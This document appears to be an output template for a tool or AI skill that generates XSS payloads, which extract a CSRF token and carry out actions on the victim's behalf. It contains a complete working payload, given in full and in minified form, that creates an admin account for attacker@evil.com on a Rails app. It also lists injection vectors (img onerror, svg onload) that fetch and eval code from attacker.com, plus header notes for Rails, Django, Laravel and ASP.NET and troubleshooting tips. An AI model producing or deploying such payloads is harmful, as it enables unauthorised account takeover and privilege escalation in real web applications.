# Output Formatting

Standard output format for generated XSS action payloads.

## Standard Output Format

```markdown
## Generated XSS Action Payload

### Scenario Summary

- **CSRF Token Location**: [description]
- **Target Action**: [description]
- **Constraints**: [list]
- **Framework**: [if specified]

### Full Payload

```javascript
[COMPLETE_PAYLOAD_CODE]
```

### Usage Instructions

1. Host this payload at `https://attacker-controlled-domain.com/payload.js`
2. Inject via XSS: `<script src="https://attacker-controlled-domain.com/payload.js"></script>`

### Expected Behavior

- Token extraction: [what gets extracted]
- Request sent to: [endpoint]
- Expected response: [description]
- Success indicator: [how to verify]

### Testing Recommendations

1. Test token extraction in browser console first
2. Verify target endpoint accepts the request format
3. Check CSRF header name matches application expectations
```

---

## Output Variations

### Minimal Output

**Use when:** User wants just the code, no explanation.

```markdown
## Payload

```javascript
[CODE]
```
```

---

### Verbose Output

**Use when:** User is learning or needs full documentation.

```markdown
## Generated XSS Action Payload

### Scenario Summary

- **CSRF Token Location**: Meta tag `<meta name="csrf-token">`
- **Target Action**: POST to `/admin/users/invite` creating admin user
- **Constraints**: Same-origin only
- **Framework**: Rails

### Full Payload

```javascript
(function() {
  // Extract CSRF token from Rails meta tag
  const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;

  // Verify token exists
  if (!csrfToken) {
    console.error('CSRF token not found');
    return;
  }

  // Create admin user
  fetch('/admin/users/invite', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken  // Rails expects X-CSRF-Token header
    },
    credentials: 'same-origin',  // Include session cookies
    body: JSON.stringify({
      user: {
        email: 'attacker@evil.com',
        role: 'admin'
      }
    })
  })
  .then(response => {
    if (response.ok) {
      console.log('Admin user created successfully');
    }
  });
})();
```

### Code Breakdown

1. **IIFE wrapper**: `(function() { ... })()` executes immediately and doesn't pollute global scope
2. **Token extraction**: `document.querySelector('meta[name="csrf-token"]')?.content` safely gets token
3. **Null check**: Returns early if token not found
4. **Fetch request**: POST with JSON body and CSRF header
5. **Credentials**: `same-origin` ensures cookies are sent
6. **Response handling**: Logs success (optional)

### Usage Instructions

1. Save this code to a file (e.g., `payload.js`)
2. Host on attacker-controlled server
3. Inject via XSS: `<script src="https://your-server.com/payload.js"></script>`

### Alternative Injection Methods

**Script tag:**
```html
<script src="https://attacker.com/payload.js"></script>
```

**Event handler:**
```html
<img src=x onerror="fetch('https://attacker.com/payload.js').then(r=>r.text()).then(eval)">
```

**SVG:**
```html
<svg onload="fetch('https://attacker.com/payload.js').then(r=>r.text()).then(eval)">
```

### Expected Behavior

- **Token extraction**: Reads value from `<meta name="csrf-token" content="...">`
- **Request sent to**: `POST /admin/users/invite`
- **Request body**: `{"user":{"email":"attacker@evil.com","role":"admin"}}`
- **Expected response**: 200/201 with user creation confirmation
- **Success indicator**: Check `/admin/users` for new admin account

### Testing Recommendations

1. **Test token extraction first:**
   ```javascript
   console.log(document.querySelector('meta[name="csrf-token"]')?.content);
   ```

2. **Verify endpoint exists:**
   - Check network tab for similar requests
   - Review API documentation if available

3. **Check header name:**
   - Rails: `X-CSRF-Token`
   - Some apps use `X-CSRFToken` or `X-XSRF-TOKEN`

4. **Confirm body format:**
   - Rails nested: `{ user: { ... } }`
   - Some APIs use flat structure

### Troubleshooting

| Issue | Check |
|-------|-------|
| 403 Forbidden | Wrong header name or expired token |
| 422 Unprocessable | Missing required fields or wrong format |
| 404 Not Found | Wrong endpoint path |
| Silent failure | Token not found, check selector |
```

---

### Minified Output

**Use when:** User specified minification constraint.

```markdown
## Payload (Minified)

```javascript
(function(){var t=document.querySelector('meta[name="csrf-token"]')?.content;if(!t)return;fetch('/admin/users/invite',{method:'POST',headers:{'Content-Type':'application/json','X-CSRF-Token':t},credentials:'same-origin',body:JSON.stringify({user:{email:'attacker@evil.com',role:'admin'}})})})();
```

**Character count:** 312

### Expanded Version (for reference)

```javascript
[FULL_READABLE_VERSION]
```
```

---

## Framework-Specific Output Notes

### Rails Output

- Use `X-CSRF-Token` header (not `X-CSRFToken`)
- Token in `meta[name="csrf-token"]`
- Nested params: `{ user: { ... } }`

### Django Output

- Use `X-CSRFToken` header (no hyphen before Token)
- Token in cookie `csrftoken` or form field `csrfmiddlewaretoken`
- Flat params: `{ email: '...', is_staff: true }`

### Laravel Output

- Use `X-XSRF-TOKEN` header
- Token in cookie `XSRF-TOKEN` (URL-encoded)
- Must `decodeURIComponent()` the cookie value

### ASP.NET Output

- Token in form field `__RequestVerificationToken`
- Usually expects form-urlencoded, not JSON
- Field name includes token in body, not header

---

## Output Quality Checklist

Before delivering output, verify:

| Check | Description |
|-------|-------------|
| ✅ Token selector correct | Matches actual location in target app |
| ✅ Header name correct | Matches framework expectation |
| ✅ Content-Type correct | JSON or form-urlencoded as appropriate |
| ✅ Body format correct | Nested or flat, correct field names |
| ✅ Constraints respected | Same-origin, minified, etc. |
| ✅ No extras | No features user didn't request |
| ✅ Comments minimal | Only if user is learning |
